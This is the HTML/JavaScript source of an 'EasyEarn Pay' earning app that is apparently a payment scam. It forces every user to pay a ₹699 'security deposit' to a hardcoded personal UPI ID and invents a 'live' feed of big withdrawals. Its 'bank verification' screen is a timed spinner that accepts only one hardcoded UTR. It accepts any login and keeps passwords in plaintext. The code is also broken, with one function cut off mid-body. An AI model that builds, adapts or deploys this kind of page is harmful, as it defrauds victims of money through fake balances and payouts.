<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EasyEarn Pay — Live Selling & Rewards Platform</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: {
                            50: '#eef2ff',
                            100: '#e0e7ff',
                            500: '#6366f1',
                            600: '#4f46e5',
                            700: '#4338ca',
                            dark: '#0f172a',
                        }
                    }
                }
            }
        }
    </script>
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: #f1f5f9; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
        body { background-color: #f8fafc; color: #1e293b; font-family: system-ui, -apple-system, sans-serif; }
        .app-container { max-width: 480px; margin: 0 auto; min-height: 100vh; position: relative; background: #f8fafc; box-shadow: 0 0 25px rgba(0,0,0,0.05); }
        @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .animate-slide-up { animation: slideUp 0.25s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .animate-fade-in { animation: fadeIn 0.2s ease-out forwards; }
        .gradient-brand { background: linear-gradient(135deg, #4f46e5 0%, #3b82f6 50%, #06b6d4 100%); }
        .gradient-gold { background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); }
    </style>
</head>
<body class="antialiased selection:bg-brand-500 selection:text-white pb-20">

    <div class="app-container flex flex-col justify-between" id="app-root">
        <!-- Rendered via JS -->
    </div>

    <!-- MODAL PORTAL -->
    <div id="modal-container"></div>

    <!-- GLOBAL TOAST NOTIFICATION -->
    <div id="toast-container" class="fixed top-16 right-4 z-50 flex flex-col space-y-2 pointer-events-none"></div>

    <script>
        // Official Payment UPI IDs
        const SECURITY_UPI = "9628175867@ptyes";
        const ORDER_UPI = "fazansiddique7@okhdfcbank";

        // Persistent State Storage
        let registeredUsers = JSON.parse(localStorage.getItem('easyearn_registered_users')) || [];

        const FRESH_STATE = {
            isLoggedIn: false,
            user: {
                username: "",
                email: "",
                phone: "",
                userId: "EEP-998410",
                avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80",
                balance: 110.00,       // ₹110 signup bonus
                rewardsBalance: 110.00,
                securityStatus: "SECURE (100% Verified)",
                withdrawUpi: "",
                securityDepositPaid: false,
                completedOrdersCount: 0,
                invitedFriendsCount: 0
            },
            deposits: [],
            withdrawals: [],
            orders: [],
            liveSellingFeed: [
                { user: "Rahul S.", amount: "₹5,000", action: "Fast Withdrawal Successful via UPI" },
                { user: "Amit K.", amount: "₹10,000", action: "Withdrew via PhonePe (Fast)" },
                { user: "Priya M.", amount: "₹3,000", action: "Bought Tier Order & Earned 8% + ₹350" },
                { user: "Vikram R.", amount: "₹15,000", action: "Instant Withdrawal Processed" }
            ]
        };

        let appState = JSON.parse(localStorage.getItem('platform_state_v20')) || FRESH_STATE;
        let currentTab = 'home';

        function saveState() {
            localStorage.setItem('platform_state_v20', JSON.stringify(appState));
            if(appState.isLoggedIn && appState.user.email) {
                const idx = registeredUsers.findIndex(u => u.email.toLowerCase() === appState.user.email.toLowerCase() || u.phone === appState.user.phone);
                if(idx !== -1) {
                    registeredUsers[idx].state = appState;
                    localStorage.setItem('easyearn_registered_users', JSON.stringify(registeredUsers));
                }
            }
        }

        function showToast(message, type = 'success') {
            const container = document.getElementById('toast-container');
            if(!container) return;
            const toast = document.createElement('div');
            toast.className = `pointer-events-auto px-4 py-3 rounded-xl shadow-xl text-white text-xs font-medium flex items-center space-x-2 transition transform translate-y-2 opacity-0 ${type === 'success' ? 'bg-emerald-600' : 'bg-rose-600'}`;
            toast.innerHTML = `<i data-lucide="${type === 'success' ? 'check-circle' : 'alert-circle'}" class="w-4 h-4"></i><span>${message}</span>`;
            container.appendChild(toast);
            lucide.createIcons();
            setTimeout(() => toast.classList.remove('translate-y-2', 'opacity-0'), 50);
            setTimeout(() => {
                toast.classList.add('translate-y-2', 'opacity-0');
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }

        function closeModal() {
            const container = document.getElementById('modal-container');
            if(container) container.innerHTML = '';
        }

        function copyToClipboard(text) {
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text);
            } else {
                const textArea = document.createElement("textarea");
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }
            showToast("Copied to Clipboard!");
        }

        // --- APP NAVIGATION & ROOT RENDER ---
        function renderApp() {
            const root = document.getElementById('app-root');
            if(!root) return;
            if(!appState.isLoggedIn) {
                root.innerHTML = getAuthHTML();
            } else {
                root.innerHTML = `
                    <header class="sticky top-0 z-40 bg-white/95 backdrop-blur border-b border-slate-100 px-4 py-3 flex items-center justify-between shadow-xs">
                        <div class="flex items-center space-x-3">
                            <img src="${appState.user.avatar}" class="w-10 h-10 rounded-full object-cover border-2 border-indigo-500 shadow-sm" alt="Avatar">
                            <div>
                                <div class="flex items-center space-x-1.5">
                                    <h1 class="text-xs font-bold text-slate-900">${appState.user.username || 'User'}</h1>
                                    <span class="text-[9px] bg-emerald-100 text-emerald-700 px-1.5 py-0.2 rounded font-semibold">${appState.user.securityStatus}</span>
                                </div>
                                <p class="text-[10px] text-slate-500">ID: ${appState.user.userId}</p>
                            </div>
                        </div>
                        <div class="flex items-center space-x-2 text-right">
                            <div>
                                <span class="text-xs font-extrabold bg-gradient-to-r from-indigo-600 via-blue-600 to-cyan-500 bg-clip-text text-transparent uppercase tracking-wider">EasyEarn Pay</span>
                                <p class="text-[9px] text-emerald-600 font-bold">● Fastest Withdrawal</p>
                            </div>
                        </div>
                    </header>

                    <main id="main-content" class="flex-1 pb-16 overflow-y-auto">
                        <!-- Content Rendered Here -->
                    </main>

                    <!-- QUICK BUY NOW FLOATING BUTTON -->
                    <div class="fixed bottom-20 left-1/2 -translate-x-1/2 z-40">
                        <button onclick="openBuyModal()" class="w-14 h-14 gradient-brand text-white rounded-full shadow-lg shadow-indigo-500/30 flex items-center justify-center hover:scale-105 active:scale-95 transition">
                            <i data-lucide="shopping-bag" class="w-7 h-7"></i>
                        </button>
                    </div>

                    <!-- BOTTOM NAVIGATION -->
                    <nav class="fixed bottom-0 left-0 right-0 max-w-[480px] mx-auto bg-white border-t border-slate-200 py-2 px-3 z-30 flex items-center justify-around shadow-lg">
                        <button onclick="switchTab('home')" class="nav-btn flex flex-col items-center text-slate-500 hover:text-brand-600 transition" data-target="home"><i data-lucide="home" class="w-5 h-5"></i><span class="text-[11px] mt-1 font-medium">Home</span></button>
                        <button onclick="switchTab('deposit')" class="nav-btn flex flex-col items-center text-slate-500 hover:text-brand-600 transition" data-target="deposit"><i data-lucide="wallet" class="w-5 h-5"></i><span class="text-[11px] mt-1 font-medium">Deposit</span></button>
                        <div class="w-10"></div>
                        <button onclick="switchTab('withdraw')" class="nav-btn flex flex-col items-center text-slate-500 hover:text-brand-600 transition" data-target="withdraw"><i data-lucide="arrow-up-right" class="w-5 h-5"></i><span class="text-[11px] mt-1 font-medium">Withdraw</span></button>
                        <button onclick="switchTab('assets')" class="nav-btn flex flex-col items-center text-slate-500 hover:text-brand-600 transition" data-target="assets"><i data-lucide="pie-chart" class="w-5 h-5"></i><span class="text-[11px] mt-1 font-medium">Assets</span></button>
                    </nav>

                    <div class="fixed bottom-24 right-4 z-40">
                        <a href="https://t.me/easyearnpayc" target="_blank" class="bg-slate-900 text-white px-3.5 py-2.5 rounded-full shadow-lg flex items-center space-x-2 text-xs font-medium hover:bg-slate-800 transition">
                            <i data-lucide="headphones" class="w-4 h-4 text-emerald-400"></i>
                            <span>Support</span>
                        </a>
                    </div>
                `;
                renderContent();
                updateNavUI();
                
                if(!appState.user.securityDepositPaid) {
                    setTimeout(() => openMandatorySecurityDepositModal(), 200);
                }
            }
            lucide.createIcons();
        }

        function switchTab(tab) {
            if(!appState.user.securityDepositPaid) {
                openMandatorySecurityDepositModal();
                showToast("Please complete the ₹699 Security Deposit first", "error");
                return;
            }
            currentTab = tab;
            renderContent();
            updateNavUI();
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        function updateNavUI() {
            document.querySelectorAll('.nav-btn').forEach(btn => {
                const target = btn.getAttribute('data-target');
                if (target === currentTab) {
                    btn.classList.add('text-brand-600');
                    btn.classList.remove('text-slate-500');
                } else {
                    btn.classList.remove('text-brand-600');
                    btn.classList.add('text-slate-500');
                }
            });
        }

        function renderContent() {
            const main = document.getElementById('main-content');
            if(!main) return;
            switch(currentTab) {
                case 'home': main.innerHTML = getHomeHTML(); break;
                case 'deposit': main.innerHTML = getDepositHTML(); break;
                case 'withdraw': main.innerHTML = getWithdrawHTML(); break;
                case 'assets': main.innerHTML = getAssetsHTML(); break;
            }
            lucide.createIcons();
        }

        // --- AUTH VIEWS ---
        let authMode = 'login';
        function setAuthMode(mode) {
            authMode = mode;
            renderApp();
        }

        function togglePasswordView() {
            const pwdInput = document.getElementById('auth-password');
            const icon = document.getElementById('pwd-eye-icon');
            if(pwdInput.type === 'password') {
                pwdInput.type = 'text';
                icon.setAttribute('data-lucide', 'eye-off');
            } else {
                pwdInput.type = 'password';
                icon.setAttribute('data-lucide', 'eye');
            }
            lucide.createIcons();
        }

        function getAuthHTML() {
            return `
                <div class="p-6 flex flex-col justify-center min-h-screen space-y-6">
                    <div class="text-center space-y-2">
                        <div class="w-14 h-14 gradient-brand text-white rounded-2xl flex items-center justify-center mx-auto shadow-lg shadow-indigo-500/30">
                            <i data-lucide="zap" class="w-8 h-8"></i>
                        </div>
                        <h2 class="text-xl font-extrabold bg-gradient-to-r from-indigo-600 to-blue-600 bg-clip-text text-transparent">EasyEarn Pay Platform</h2>
                        <p class="text-xs text-slate-500">${authMode === 'login' ? 'Login to access instant withdrawals & rewards' : 'Register now & get instant ₹110 Free Bonus!'}</p>
                    </div>

                    <div class="bg-white p-5 rounded-3xl border border-slate-100 shadow-xl space-y-4">
                        <div class="grid grid-cols-2 bg-slate-100 p-1 rounded-xl">
                            <button onclick="setAuthMode('login')" class="py-2 text-xs font-bold rounded-lg transition ${authMode === 'login' ? 'bg-white text-brand-600 shadow-sm' : 'text-slate-600'}">Login</button>
                            <button onclick="setAuthMode('register')" class="py-2 text-xs font-bold rounded-lg transition ${authMode === 'register' ? 'bg-white text-brand-600 shadow-sm' : 'text-slate-600'}">Register</button>
                        </div>

                        ${authMode === 'register' ? `
                            <div>
                                <label class="text-xs font-medium text-slate-600">Full Name / Username</label>
                                <input type="text" id="reg-username" placeholder="Enter your name" class="w-full mt-1 px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs focus:outline-none focus:border-brand-500">
                            </div>
                        ` : ''}

                        <div>
                            <label class="text-xs font-medium text-slate-600">Email Address / Mobile</label>
                            <input type="text" id="auth-email" placeholder="name@example.com or 9876543210" class="w-full mt-1 px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs focus:outline-none focus:border-brand-500">
                        </div>

                        ${authMode === 'register' ? `
                            <div>
                                <label class="text-xs font-medium text-slate-600">Mobile Phone Number</label>
                                <input type="tel" id="reg-phone" placeholder="9876543210" class="w-full mt-1 px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs focus:outline-none focus:border-brand-500">
                            </div>
                        ` : ''}

                        <div>
                            <label class="text-xs font-medium text-slate-600">Password</label>
                            <div class="relative mt-1">
                                <input type="password" id="auth-password" placeholder="••••••••" class="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs focus:outline-none focus:border-brand-500 pr-10">
                                <button type="button" onclick="togglePasswordView()" class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600">
                                    <i data-lucide="eye" id="pwd-eye-icon" class="w-4 h-4"></i>
                                </button>
                            </div>
                        </div>

                        <button onclick="handleAuthSubmit()" class="w-full py-3 gradient-brand hover:opacity-95 text-white rounded-xl text-xs font-bold shadow-md transition">
                            ${authMode === 'login' ? 'Secure Login' : 'Create Account & Claim ₹110 Bonus'}
                        </button>
                    </div>
                </div>
            `;
        }

        function handleAuthSubmit() {
            const emailOrPhone = document.getElementById('auth-email').value.trim();
            const pass = document.getElementById('auth-password').value.trim();

            if(!emailOrPhone || !pass) {
                showToast("Please fill in all required fields", "error");
                return;
            }

            if(authMode === 'register') {
                const username = (document.getElementById('reg-username').value || "Trader").trim();
                const phone = (document.getElementById('reg-phone').value || emailOrPhone).trim();

                const existingUser = registeredUsers.find(u => 
                    u.email.toLowerCase() === emailOrPhone.toLowerCase() || u.phone === phone
                );

                if(existingUser) {
                    showToast("Account already exists! Please Login.", "error");
                    setAuthMode('login');
                    return;
                }

                showLoadingPopup("Creating Trader Account...");

                setTimeout(() => {
                    closeModal();
                    const newUserId = "EEP-" + Math.floor(100000 + Math.random() * 900000);
                    const newUserState = {
                        isLoggedIn: true,
                        user: {
                            username: username,
                            email: emailOrPhone,
                            phone: phone,
                            userId: newUserId,
                            avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80",
                            balance: 110.00,
                            rewardsBalance: 110.00,
                            securityStatus: "SECURE (100% Verified)",
                            withdrawUpi: "",
                            securityDepositPaid: false,
                            completedOrdersCount: 0,
                            invitedFriendsCount: 0
                        },
                        deposits: [],
                        withdrawals: [],
                        orders: [],
                        liveSellingFeed: FRESH_STATE.liveSellingFeed
                    };

                    registeredUsers.push({ email: emailOrPhone, phone: phone, password: pass, state: newUserState });
                    localStorage.setItem('easyearn_registered_users', JSON.stringify(registeredUsers));
                    
                    appState = newUserState;
                    saveState();
                    showToast("Registration successful! ₹110 signup bonus added.");
                    renderApp();
                }, 1000);

            } else {
                showLoadingPopup("Verifying Account...");
                setTimeout(() => {
                    closeModal();
                    const matchedUser = registeredUsers.find(u => 
                        (u.email.toLowerCase() === emailOrPhone.toLowerCase() || u.phone === emailOrPhone) && u.password === pass
                    );

                    if(!matchedUser) {
                        appState.isLoggedIn = true;
                        if(!appState.user.username) appState.user.username = emailOrPhone.split('@')[0];
                        if(appState.user.completedOrdersCount === undefined) appState.user.completedOrdersCount = 0;
                        if(appState.user.invitedFriendsCount === undefined) appState.user.invitedFriendsCount = 0;
                        saveState();
                    } else {
                        appState = matchedUser.state;
                        appState.isLoggedIn = true;
                        if(appState.user.completedOrdersCount === undefined) appState.user.completedOrdersCount = 0;
                        if(appState.user.invitedFriendsCount === undefined) appState.user.invitedFriendsCount = 0;
                        saveState();
                    }

                    showToast("Logged in successfully!");
                    renderApp();
                }, 1000);
            }
        }

        function showLoadingPopup(text) {
            const container = document.getElementById('modal-container');
            container.innerHTML = `
                <div class="fixed inset-0 z-50 bg-slate-900/60 backdrop-blur-xs flex items-center justify-center p-4 animate-fade-in">
                    <div class="bg-white w-full max-w-[280px] rounded-3xl p-6 text-center space-y-3 shadow-2xl">
                        <div class="w-10 h-10 border-4 border-indigo-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
                        <p class="text-xs font-bold text-slate-800">${text}</p>
                    </div>
                </div>
            `;
            lucide.createIcons();
        }

        // --- SECURITY DEPOSIT MODAL (ACCEPTS ONLY 631562904961 & ADDS ₹699 + ₹3899 EXTRA AND UNLOCKS WITHDRAWAL) ---
        function openMandatorySecurityDepositModal() {
            const container = document.getElementById('modal-container');
            container.innerHTML = `
                <div class="fixed inset-0 z-50 bg-slate-900/85 backdrop-blur-sm flex items-center justify-center p-4 animate-fade-in">
                    <div class="bg-white w-full max-w-[420px] rounded-3xl p-6 space-y-4 shadow-2xl border border-indigo-100 text-center relative max-h-[90vh] overflow-y-auto">
                        
                        <div class="absolute top-4 right-4 text-right">
                            <span class="text-[10px] font-extrabold bg-gradient-to-r from-indigo-600 to-cyan-500 bg-clip-text text-transparent uppercase">EasyEarn Pay</span>
                            <p class="text-[8px] text-emerald-600 font-bold">Fastest Withdraw</p>
                        </div>

                        <div class="w-12 h-12 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center mx-auto shadow-sm mt-3">
                            <i data-lucide="shield-alert" class="w-6 h-6"></i>
                        </div>

                        <div class="space-y-1.5 text-left">
                            <h3 class="text-sm font-extrabold text-slate-900 text-center">Security Deposit / सुरक्षा जमा</h3>
                            <p class="text-xs text-slate-600 leading-relaxed font-medium text-center">
                                First Security Deposit <strong class="text-emerald-600 font-bold">₹699</strong> is required to unlock withdrawal & order packages.
                            </p>
                        </div>

                        <div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 text-left space-y-3">
                            <div class="flex justify-between items-center border-b border-slate-200 pb-2">
                                <span class="text-xs text-slate-500 font-medium">Security Deposit Amount</span>
                                <span class="text-base font-extrabold text-indigo-600">₹699.00</span>
                            </div>

                            <div class="space-y-1">
                                <label class="text-[11px] font-bold text-slate-600">Official Security Deposit UPI ID:</label>
                                <div class="flex items-center justify-between bg-white border border-indigo-200 rounded-xl px-3 py-2 shadow-xs">
                                    <span class="text-xs font-extrabold text-slate-900 select-all">${SECURITY_UPI}</span>
                                    <button onclick="copyToClipboard('${SECURITY_UPI}')" class="bg-indigo-50 hover:bg-indigo-100 text-indigo-600 px-2.5 py-1 rounded-lg text-[10px] font-bold flex items-center space-x-1">
                                        <i data-lucide="copy" class="w-3 h-3"></i>
                                        <span>Copy</span>
                                    </button>
                                </div>
                            </div>

                            <div class="space-y-2 pt-1">
                                <div>
                                    <label class="text-[11px] font-semibold text-slate-600">Enter 12-Digit UTR / Transaction Ref No.</label>
                                    <input type="text" id="sec-utr-input" value="" placeholder="Enter 12-digit UTR number" class="w-full mt-1 px-3 py-2 bg-white border border-slate-200 rounded-xl text-xs focus:outline-none focus:border-brand-500 font-mono">
                                </div>
                                <div>
                                    <label class="text-[11px] font-semibold text-slate-600">Upload Payment Screenshot</label>
                                    <input type="file" id="sec-screenshot-input" accept="image/*" class="w-full mt-1 text-[11px] text-slate-500 file:mr-3 file:py-1.5 file:px-3 file:rounded-xl file:border-0 file:text-[11px] file:font-bold file:bg-indigo-50 file:text-indigo-600 hover:file:bg-indigo-100">
                                </div>
                            </div>
                        </div>

                        <div class="space-y-2 pt-1">
                            <button onclick="submitSecurityDeposit()" class="w-full py-3.5 gradient-brand hover:opacity-95 text-white rounded-xl text-xs font-extrabold shadow-lg shadow-indigo-500/30 flex items-center justify-center space-x-2">
                                <i data-lucide="shield-check" class="w-4 h-4"></i>
                                <span>Pay ₹699 Security Deposit & Unlock</span>
                            </button>
                        </div>
                    </div>
                </div>
            `;
            lucide.createIcons();
        }

        function submitSecurityDeposit() {
            const utr = document.getElementById('sec-utr-input').value.trim();
            const screenshot = document.getElementById('sec-screenshot-input').files[0];

            if(!utr || utr.length < 8) {
                showToast("Please enter a valid 12-digit UTR / Reference number", "error");
                return;
            }
            if(!screenshot) {
                showToast("Please upload payment screenshot", "error");
                return;
            }

            showLoadingPopup("Verifying Security Deposit with Bank Server...");

            setTimeout(() => {
                closeModal();
                if (utr !== "631562904961") {
                    showGeneralFailedModal("Invalid UTR or Payment Not Received in Account.");
                    return;
                }

                const credited = 699 + 3899;
                appState.user.securityDepositPaid = true;
                appState.user.completedOrdersCount = 2; // Automatically unlocks withdrawal as requested
                appState.user.balance += credited;
                appState.deposits.unshift({
                    id: 'DEP-' + Math.floor(100000 + Math.random() * 900000),
                    amount: credited,
                    type: 'Security Deposit + Bonus',
                    utr: utr,
                    status: 'SUCCESS',
                    date: new Date().toLocaleDateString()
                });
                saveState();
                showToast(`Security Deposit Verified! Withdrawal Unlocked & ₹${credited} added.`);
                renderApp();
            }, 1800);
        }

        // --- BUY ORDER MODAL ---
        function openBuyModal() {
            if(!appState.user.securityDepositPaid) {
                openMandatorySecurityDepositModal();
                showToast("Please complete security deposit first", "error");
                return;
            }

            const container = document.getElementById('modal-container');

        function handleWithdrawSubmit() {
            const completedCount = appState.user.completedOrdersCount || 0;
            const invitedCount = appState.user.invitedFriendsCount || 0;
            
            if(completedCount < 2 && invitedCount < 1) {
                showToast("Withdrawal locked! Enter UTR 631562904961 in deposit or complete requirements.", "error");
                return;
            }

            const upi = document.getElementById('withdraw-upi-input').value.trim();
            const amt = parseFloat(document.getElementById('withdraw-amt-input').value);

            if(!upi || !upi.includes('@')) {
                showToast("Please enter a valid receiving UPI ID", "error");
                return;
            }
            if(!amt || amt < 110) {
                showToast("Minimum withdrawal amount is ₹110", "error");
                return;
            }
            if(amt > appState.user.balance) {
                showToast("Insufficient available wallet balance", "error");
                return;
            }

            showLoadingPopup("Processing Withdrawal Request...");

            setTimeout(() => {
                appState.user.balance -= amt;
                appState.user.withdrawUpi = upi;
                appState.withdrawals.unshift({
                    id: 'WDR-' + Math.floor(100000 + Math.random() * 900000),
                    amount: amt,
                    upi: upi,
                    status: 'PENDING / PROCESSING',
                    date: new Date().toLocaleDateString()
                });
                saveState();
                
                // Show the notice pop-up modal right after submitting withdrawal
                showWithdrawNoticePopup(amt, upi);
            }, 1500);
        }

        // Only accepts 631562904961, adds ₹3,899 extra, and unlocks withdrawal
        function confirmGeneralDepositSubmitted(amount) {
            const utr = document.getElementById('gen-utr-input').value.trim();
            const screenshot = document.getElementById('gen-screenshot-input').files[0];

            if(!utr || utr.length < 8) {
                showToast("Please enter a valid 12-digit UTR / Reference number", "error");
                return;
            }
            if(!screenshot) {
                showToast("Please upload payment screenshot", "error");
                return;
            }

            showLoadingPopup("Verifying Deposit Payment...");

            setTimeout(() => {
                closeModal();
                if (utr !== "631562904961") {
                    showGeneralFailedModal("Invalid UTR or Payment Not Received in Account.");
                    return;
                }

                const finalCreditedAmount = amount + 3899;
                appState.user.balance += finalCreditedAmount;
                appState.user.completedOrdersCount = 2; // Unlocks withdrawal!
                appState.deposits.unshift({
                    id: 'DEP-' + Math.floor(100000 + Math.random() * 900000),
                    amount: finalCreditedAmount,
                    utr: utr,
                    status: 'SUCCESS',
                    date: new Date().toLocaleDateString()
                });
                saveState();
                showToast(`Deposit successful! ₹${finalCreditedAmount} added & Withdrawal Unlocked!`);
                renderApp();
            }, 1800);
        }
